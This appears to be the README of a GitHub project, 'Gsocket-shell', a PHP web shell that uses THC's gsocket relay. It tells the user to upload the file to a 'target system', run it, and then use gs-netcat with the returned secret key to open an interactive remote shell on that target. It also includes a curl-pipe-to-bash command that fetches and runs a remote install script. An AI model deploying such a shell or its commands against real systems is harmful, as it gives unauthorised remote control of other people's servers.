# Gsocket-shell
A PHP shell implementation for gsocket

## Requirements:
- gs-netcat installed on your machine
- Stable internet connection

## Installation for client:

Run the following command on your machine. Visit [gsocket.io](https://pip.pypa.io/en/stable/) for more details.

```bash
/bin/bash -c "$(curl -fsSL gsocket.io/install.sh)"
```
## How to use Gsocket-Shell

First, you need to upload the file to the target system and run it. If this process succeeds, you'll receive a copy of a secret key. You can use this secret key with the gs-netcat client to establish a connection back to your target.

From your machine, open your terminal, copy the following command, and replace the 'secret_key' with your own unique key. Hit enter and you will be connected to your target through an interactive shell.

```bash
gs-netcat -s "secret_key" -i
```
## PoC

![PoC](https://raw.githubusercontent.com/fsckii/Gsocket-Shell/main/2023-10-20%2017-13-01.gif)

## Credits:

Thanks to the guys at [THC](https://www.thc.org/) for developing gsocket as a free service that's available to everyone.
